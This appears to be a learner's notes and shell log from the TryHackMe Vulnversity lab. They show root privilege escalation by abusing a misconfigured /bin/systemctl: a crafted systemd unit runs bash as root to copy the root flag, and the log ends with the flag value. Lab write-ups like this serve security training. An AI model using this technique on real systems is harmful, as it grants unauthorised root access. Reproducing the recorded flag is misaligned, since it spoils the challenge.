Wednesday 27 January 2021 12:04:47 PM 

url: https://tryhackme.com/room/vulnversity

port 445 actual samba port
port 139 netbios port for compatibility
 
 privesc of /bin/systemctl
 priv=$(mktemp).service #The first thing we need to is create an environment variable!
 
www-data@vulnuniversity:/$ echo '[Service]
echo '[Service]
> ExecStart=/bin/bash -c "cat /root/root.txt > /opt/flag"
ExecStart=/bin/bash -c "cat /root/root.txt > /opt/flag"
> [Install]
[Install]
> WantedBy=multi-user.target' > $priv
WantedBy=multi-user.target' > $priv
 #Now we need to create a unit file and assign this to the environment variable.

What we have done here is to simply create a service which will be executing "BASH", then reading the flag from the root directory and then writing it in the flag (file) in /opt directory.

Now we need to run this unit file using systemctl.

/bin/systemctl link $priv
/bin/systemctl link $priv
Created symlink from /etc/systemd/system/tmp.j0zOIXPH9A.service to /tmp/tmp.j0zOIXPH9A.service.
www-data@vulnuniversity:/$ /bin/systemct enable --now $priv
/bin/systemct enable --now $priv
bash: /bin/systemct: No such file or directory
www-data@vulnuniversity:/$ /bin/systemctl enable --now $priv
/bin/systemctl enable --now $priv
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.j0zOIXPH9A.service to /tmp/tmp.j0zOIXPH9A.service.
www-data@vulnuniversity:/$ ls
ls
bin   etc         lib         media  proc  sbin  sys  var
boot  home        lib64       mnt    root  snap  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv   usr
www-data@vulnuniversity:/$ cat flag
cat flag
cat: flag: No such file or directory
www-data@vulnuniversity:/$ cd /opt
cd /opt
www-data@vulnuniversity:/opt$ ls
ls
flag
www-data@vulnuniversity:/opt$ cat flag
cat flag
a58ff8579f0a9270368d33a9966c7fd5
www-data@vulnuniversity:/opt$ 

